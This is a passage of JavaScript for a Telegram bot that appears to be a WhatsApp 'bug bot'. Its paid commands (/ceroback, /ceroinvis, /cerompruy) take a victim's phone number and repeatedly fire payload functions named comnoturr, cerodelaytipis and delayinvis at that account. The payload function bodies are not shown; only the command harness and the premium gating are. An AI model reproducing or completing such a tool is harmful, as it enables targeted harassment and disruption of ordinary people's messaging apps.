`<blockquote><strong>✅ (bug) selesai untuk : ${q}</strong></blockquote>`, 
    {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "「 👾 」CHECK TERGET", url: `https://wa.me/${q}`, style: "success" }]],
    },
  });

  (async () => {
    for (let i = 0; i < 3; i++) {
      await comnoturr(sock, target);
      await cerodelaytipis(sock, target);
    }
  })();
});
//COMMAND BUGS 3
bot.command("ceroback", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Example : /ceroback 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`<blockquote><strong>✅ (bug) selesai untuk : ${q}</strong></blockquote>`, 
    {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "「 👾 」CHECK TERGET", url: `https://wa.me/${q}`, style: "success" }]],
    },
  });

  (async () => {
    for (let i = 0; i < 4; i++) {
      await delayinvis(sock, target);
    }
  })();
});
//COMMAND BUGS 4
bot.command("ceroinvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Example : /ceroinvis 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`<blockquote><strong>✅ (bug) selesai untuk : ${q}</strong></blockquote>`, 
    {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "「 👾 」CHECK TERGET", url: `https://wa.me/${q}`, style: "success" }]],
    },
  });

  (async () => {
    for (let i = 0; i < 4; i++) {
      await cerodelaytipis(sock, target);
    }
  })();
});
//COMMAND BUGS 5
bot.command("cerompruy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Example : /cerompruy 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`<blockquote><strong>✅ (bug) selesai untuk : ${q}</strong></blockquote>`, 
    {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "「 👾 」CHECK TERGET", url: `https://wa.me/${q}`, style: "success" }]],
    },
  });

  (async () => {
    for (let i = 0; i < 4; i++) {
      await comnoturr(sock, target);
    }
  })();
});

// FUNCTION BUG DISINI

// AKHIR FUNCTION BUGS 


bot.launch()
